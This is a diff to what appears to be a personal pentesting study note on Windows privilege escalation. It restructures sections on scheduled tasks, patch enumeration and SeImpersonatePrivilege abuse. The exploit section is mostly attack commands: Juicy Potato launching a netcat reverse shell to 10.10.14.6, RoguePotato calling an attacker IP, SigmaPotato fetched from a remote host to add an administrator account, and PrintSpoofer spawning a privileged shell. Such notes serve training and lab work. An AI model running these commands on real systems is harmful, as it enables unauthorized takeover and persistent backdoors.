@@ -10,14 +10,15 @@
 	- [[#Windows Services#Weak Service Permissions|Weak Service Permissions]]
 	- [[#Windows Services#Weak Service Binary Permissions|Weak Service Binary Permissions]]
 - [[#DLL Hijacking|DLL Hijacking]]
-- [[#Other windows components|Other windows components]]
-	- [[#Other windows components#UAC Bypass|UAC Bypass]]
-	- [[#Other windows components#Scheduled Tasks|Scheduled Tasks]]
-	- [[#Other windows components#Using Exploits|Using Exploits]]
-		- [[#Using Exploits#SeImpersonatePrivilege|SeImpersonatePrivilege]]
-		- [[#Using Exploits#Print Spoofer|Print Spoofer]]
-		- [[#Using Exploits#Rogue Potato|Rogue Potato]]
-		- [[#Using Exploits#Juicy Potato|Juicy Potato]]
+- [[#Scheduled Tasks|Scheduled Tasks]]
+- [[#Using Exploits|Using Exploits]]
+	- [[#Using Exploits#Enum|Enum]]
+	- [[#Using Exploits#SeImpersonatePrivilege|SeImpersonatePrivilege]]
+		- [[#SeImpersonatePrivilege#Rogue Potato|Rogue Potato]]
+		- [[#SeImpersonatePrivilege#Juicy Potato|Juicy Potato]]
+		- [[#SeImpersonatePrivilege#Sigma potato|Sigma potato]]
+	- [[#Using Exploits#Print Spoofer|Print Spoofer]]
+
 ## Enummeration
 
 Common methods for privilege escalation include Operating System or 3rd party software misconfigurations and missing patches.
@@ -215,13 +216,7 @@ Try to restart the service/start when procmon is on, in order to get all the eve
 Restart-Service BetaService
 ```
 
-## Other windows components
-
-### UAC Bypass
-
-^08d328
-
-### Scheduled Tasks
+## Scheduled Tasks
 
 ^cca334
 
@@ -230,24 +225,20 @@ List scheduled tasks
 schtasks /query /fo LIST /v
 ```
 We can filter out the results to find something interesting. Any task who binary we can modify
-### Using Exploits
+## Using Exploits
 
 ^ee127e
-
-#### SeImpersonatePrivilege
-
-We can leverage this privilege with any potato or with printspoofer
-
-#### Print Spoofer
-
-```bash
-wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
-```
+### Enum
 
 ```powershell
-.\PrintSpoofer64.exe -i -c powershell.exe
+systeminfo
+# Get patches installed
+Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
 ```
 
+### SeImpersonatePrivilege
+
+We can leverage this privilege with any potato or with printspoofer
 #### Rogue Potato
 
 ```bash
@@ -262,4 +253,21 @@ RoguePotato.exe -r <attacker-machine-ip> -e "C:\windows\tem\rev.exe"
 
 ```bash
 jp.exe -l 1337 -t * -p "C:\Windows\System32\cmd.exe" -a "/c \\10.10.14.6\smbFolder\nc.exe -e cmd.exe 10.10.14.6 9001"
+```
+
+#### Sigma potato
+
+```powershell
+iwr -uri http://192.168.48.3/SigmaPotato.exe -OutFile SigmaPotato.exe
+.\SigmaPotato "net user dave4 lab /add"
+.\SigmaPotato "net localgroup Administrators dave4 /add"
+```
+### Print Spoofer
+
+```bash
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+```
+
+```powershell
+.\PrintSpoofer64.exe -i -c powershell.exe
 ```
